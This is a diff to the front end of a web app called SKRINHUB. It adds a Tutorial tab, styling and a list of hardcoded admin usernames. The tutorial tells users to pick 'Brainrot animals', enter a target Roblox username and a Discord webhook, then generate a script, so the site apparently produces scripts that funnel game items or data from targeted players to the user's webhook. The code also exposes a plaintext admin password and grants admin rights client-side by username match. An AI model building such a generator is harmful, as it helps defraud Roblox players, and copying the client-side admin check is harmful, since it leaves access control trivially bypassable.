@@ -733,6 +733,7 @@
   .crb-gold    { background:rgba(255,180,0,0.1);   border:1px solid #ffb400; color:#ffb400; }
   .crb-silver  { background:rgba(192,192,192,0.1); border:1px solid #c0c0c0; color:#c0c0c0; }
   .crb-bronze  { background:rgba(205,127,50,0.1);  border:1px solid #cd7f32; color:#cd7f32; }
+  .crb-member  { background:rgba(136,136,136,0.1); border:1px solid #888;    color:#888; }
   /* -- ADMIN DASHBOARD PAGE -- */
   .adm-section { margin-bottom:1.4rem; }
   .adm-section-title { font-family:'Share Tech Mono',monospace; font-size:0.68rem; text-transform:uppercase; letter-spacing:0.14em; color:var(--admin); text-shadow:var(--admin-glow); margin-bottom:0.7rem; border-bottom:1px solid rgba(255,215,0,0.2); padding-bottom:0.4rem; }
@@ -821,6 +822,7 @@
     <span class="nav-link" onclick="switchTab('activity',this)">Activity</span>
     <span class="nav-link" onclick="switchTab('ranks',this)">Ranks</span>
     <span class="nav-link" onclick="switchTab('info',this)">Info</span>
+    <span class="nav-link" onclick="switchTab('tutorial',this)">Tutorial</span>
     <span class="nav-link" id="adminNavLink" style="display:none;color:var(--admin);text-shadow:var(--admin-glow);" onclick="switchTab('admin',this)">👑 Admin</span>
   </div>
   <div class="nav-right">
@@ -1109,6 +1111,39 @@
     </div>
 
 
+    <!-- TAB: TUTORIAL -->
+    <div class="tab-page" id="tab-tutorial">
+    <div class="wrap">
+      <div class="ranks-header"><h2>Tutorial</h2><p>Learn how to generate your script</p></div>
+      <div class="panel">
+        <div class="ph"><div class="dot dot-cyan"></div><span class="ph-title">How to Generate</span></div>
+        <div class="pb">
+          <p style="font-family:'Share Tech Mono',monospace;font-size:0.78rem;color:var(--muted);line-height:1.9;margin-bottom:1.2rem;">
+            Watch the video below to learn how to use SKRINHUB and generate your script step by step.
+          </p>
+          <div style="position:relative;width:100%;background:var(--surface);border:1px solid var(--border);border-radius:10px;overflow:hidden;">
+            <video
+              controls
+              style="display:block;width:100%;max-height:520px;background:#000;"
+              preload="metadata"
+            >
+              <source src="tutorial.mov" type="video/mp4">
+              <source src="tutorial.mov" type="video/quicktime">
+              Your browser does not support the video tag.
+            </video>
+          </div>
+          <p style="font-family:'Share Tech Mono',monospace;font-size:0.67rem;color:var(--muted);margin-top:0.9rem;line-height:1.8;">
+            <span style="color:var(--neon);">Step 1:</span> Select your Brainrot animals from the list.<br>
+            <span style="color:var(--neon);">Step 2:</span> Enter your target Roblox username.<br>
+            <span style="color:var(--neon);">Step 3:</span> Paste your Discord webhook URL.<br>
+            <span style="color:var(--neon);">Step 4:</span> Hit <span style="color:var(--neon);">Generate</span> and copy the output script.
+          </p>
+        </div>
+      </div>
+    </div>
+    </div>
+
+
     <!-- TAB: ADMIN DASHBOARD -->
     <div class="tab-page" id="tab-admin">
     <div class="wrap">
@@ -1198,6 +1233,7 @@
 /* ═══════════════════════ STATE ═══════════════════════ */
 const ADMIN_PASSWORD = '60496159';
 const SKRINHUB_API = 'https://c58175c8-ffbe-4518-9a89-8456b2c912f0-00-3jhjthxjlcyh1.sisko.replit.dev';
+const HARDCODED_ADMINS = ['2oyb', '2r2w5', 'arisxsluvsvanilla', 'levraimlk'];
 let isAdmin = false;
 let discordUser = null;
 let userRanks = JSON.parse(localStorage.getItem('skrinhub_ranks') || '{}');
@@ -1336,14 +1372,15 @@ function appendChatMsg(msg) {
     avatarHtml = `<div class="chat-msg-avatar guest">👤</div>`;
   }
 
-  const nameClass = user.id === 'admin' ? 'chat-msg-name is-admin' : (user.id ? 'chat-msg-name' : 'chat-msg-name is-guest');
+  const isHardcodedAdmin = HARDCODED_ADMINS.includes(user.username);
+  const nameClass = (user.id === 'admin' || isHardcodedAdmin) ? 'chat-msg-name is-admin' : (user.id ? 'chat-msg-name' : 'chat-msg-name is-guest');
 
   const rankKey = user.id || user.username;
   let rankBadgeHtml = '';
-  if (user.id === 'admin') {
-    rankBadgeHtml = '<span class="chat-rank-badge crb-admin">Admin</span>';
+  if (user.id === 'admin' || isHardcodedAdmin) {
+    rankBadgeHtml = '<span class="chat-rank-badge crb-admin">👑 Admin</span>';
   } else {
-    const clsMap = {diamond:'crb-diamond',platinum:'crb-platinum',gold:'crb-gold',silver:'crb-silver',bronze:'crb-bronze'};
+    const clsMap = {diamond:'crb-diamond',platinum:'crb-platinum',gold:'crb-gold',silver:'crb-silver',bronze:'crb-bronze',member:'crb-member'};
     const rk = user.rank || (rankKey && userRanks[rankKey]);
     if (rk && clsMap[rk]) rankBadgeHtml = '<span class="chat-rank-badge ' + clsMap[rk] + '">' + rk.charAt(0).toUpperCase() + rk.slice(1) + '</span>';
   }
@@ -1477,6 +1514,12 @@ function applyDiscordState() {
     memberCard.style.display = 'flex';
     document.getElementById('memberAvatar').src = discordUser.avatar || '';
     document.getElementById('memberName').textContent = discordUser.displayName || discordUser.username;
+    // Auto-grant admin to hardcoded admin users
+    if (HARDCODED_ADMINS.includes(discordUser.username) && !isAdmin) {
+      isAdmin = true;
+      if (!sessionStart) sessionStart = new Date();
+      applyAdminState();
+    }
   } else {
     pill.classList.remove('show');
     signinBtn.style.display = '';
